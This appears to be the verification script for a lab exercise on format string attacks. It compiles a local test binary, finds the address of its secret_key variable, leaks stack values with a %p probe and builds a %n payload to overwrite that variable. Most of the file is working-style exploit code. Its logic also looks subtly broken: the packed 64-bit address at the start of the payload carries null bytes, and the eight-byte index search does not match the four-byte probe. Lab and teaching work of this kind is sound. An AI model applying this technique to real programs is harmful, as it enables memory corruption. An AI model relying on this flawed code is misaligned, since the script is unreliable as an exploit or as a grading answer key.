#!/usr/bin/env bash
# verify.sh — Ex04: Format String Attack
# Compiles, resolves secret_key's address, builds the %n payload, fires it.

set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$DIR"

gcc -no-pie -o horizon_04 horizon_04.c 2>/dev/null || {
    echo "[ERROR] Compilation failed."
    exit 1
}

python3 - <<'PYEOF'
import subprocess, struct, sys

# Resolve address of secret_key
nm = subprocess.run(["nm", "./horizon_04"], capture_output=True, text=True)
addr = None
for line in nm.stdout.splitlines():
    parts = line.split()
    if len(parts) >= 3 and "secret_key" in parts[2]:
        addr = int(parts[0], 16)
        break

if addr is None:
    print("[ERROR] Symbol 'secret_key' not found.")
    sys.exit(1)

# Step 1: find the format string index by leaking the stack
probe = b"AAAA" + b".%p" * 30 + b"\n"
result = subprocess.run(["./horizon_04"], input=probe, capture_output=True, timeout=2)
output = result.stdout.decode("utf-8", errors="replace")

index = None
for i, token in enumerate(output.replace("\n","").split(".")):
    if "0x41414141" in token:
        index = i  # 1-based format string arg index
        break

if index is None:
    # Try 64-bit pattern
    for i, token in enumerate(output.replace("\n","").split(".")):
        if "4141414141414141" in token or "0x4141414141414141" in token.lower():
            index = i
            break

if index is None:
    print("[ERROR] Could not find format string index via stack leak.")
    sys.exit(1)

# Step 2: craft %n payload
# Target: write 0x1337 (4919) to secret_key
target = 0x1337
addr_bytes = struct.pack("<Q", addr)
# Characters printed so far = 8 (the address). Pad to target.
pad = target - 8
if pad < 0:
    pad = 0
payload = addr_bytes + b"A" * pad + f"%{index}$n".encode() + b"\n"

proc = subprocess.run(["./horizon_04"], input=payload, capture_output=True, timeout=2)
combined = proc.stdout + proc.stderr
if b"[SUCCESS]" in combined:
    print(combined.decode("utf-8", errors="replace"))
    sys.exit(0)

sys.exit(1)
PYEOF
